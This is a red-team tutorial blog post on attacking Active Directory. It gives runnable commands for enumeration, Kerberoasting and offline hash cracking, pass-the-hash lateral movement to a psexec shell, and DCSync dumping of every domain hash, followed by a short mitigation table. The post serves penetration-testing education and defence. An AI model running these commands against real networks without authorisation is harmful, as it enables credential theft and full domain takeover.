---
title: Active Directory Attack Fundamentals
date: 2025-03-08
tags: active-directory, red-team, windows
---

# Active Directory Attack Fundamentals

Active Directory is the backbone of most enterprise Windows environments — and one of the most attacked surfaces in red team engagements. This post covers the core attack chain from initial foothold to domain compromise.

## Prerequisites

- A foothold on a domain-joined machine (low-priv shell is fine)
- Tools: `BloodHound`, `SharpHound`, `Impacket`, `Rubeus`, `CrackMapExec`

## Phase 1 — Enumeration

First, understand the environment. Never attack blind.

```powershell
# Basic AD enum with PowerView
Get-NetDomain
Get-NetUser | select samaccountname, description
Get-NetGroup "Domain Admins" | select member
```

```bash
# From Linux with Impacket
python3 GetADUsers.py -all domain.local/user:password
```

### BloodHound Collection

```bash
# Run SharpHound collector
.\SharpHound.exe -c All --zipfilename loot.zip

# Import into BloodHound and look for:
# - Shortest path to Domain Admin
# - Kerberoastable accounts
# - AS-REP Roastable users
```

## Phase 2 — Kerberoasting

Any domain user can request a TGS for any service. If the service account has a weak password — it's game over.

```bash
# Request TGS tickets for all SPNs
python3 GetUserSPNs.py domain.local/user:password -outputfile hashes.txt

# Crack offline with hashcat
hashcat -m 13100 hashes.txt rockyou.txt --force
```

## Phase 3 — Pass-the-Hash

Once you have an NTLM hash (no need to crack it):

```bash
# Lateral movement with CrackMapExec
crackmapexec smb 192.168.1.0/24 -u Administrator -H <NTLM_HASH>

# Get a shell
python3 psexec.py -hashes :<NTLM_HASH> Administrator@192.168.1.10
```

## Phase 4 — DCSync (Domain Compromise)

If you have `Replicating Directory Changes` permissions:

```bash
python3 secretsdump.py domain.local/user:password@DC_IP -just-dc-ntds
```

You now have every NTLM hash in the domain. **Game over.**

## Defence Recommendations

| Attack | Mitigation |
|--------|-----------|
| Kerberoasting | Use strong service account passwords (25+ chars), managed service accounts |
| Pass-the-Hash | Enable Protected Users group, disable NTLM where possible |
| DCSync | Audit `Replicating Directory Changes` ACLs, alert on unusual replication |
| BloodHound paths | Regular ACL audits, tiered admin model |

## Tools Reference

- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

---

*This post is for educational and authorised penetration testing purposes only.*
